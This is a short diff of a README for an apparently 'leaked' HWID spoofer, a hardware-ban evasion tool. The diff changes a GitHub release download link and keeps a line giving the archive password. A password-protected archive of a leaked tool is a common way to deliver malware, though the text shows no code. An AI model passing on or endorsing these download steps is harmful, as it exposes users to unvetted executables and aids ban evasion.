@@ -2,7 +2,7 @@
 L3aked Hwid Spoofer Source Code By Me 
 
 
-1 - download the spoofer from the realese or just simply go to this link ( https://github.com/LeakedXx/Hwid-Spoofer-/releases/download/release/SPOOFER.rar )
+1 - download the spoofer from the realese or just simply go to this link ( https://github.com/LeakedXx/Hwid-Spoofer-/releases/download/release/Release.7z )
 
 
 2 - it may ask for a password the password is : github.com
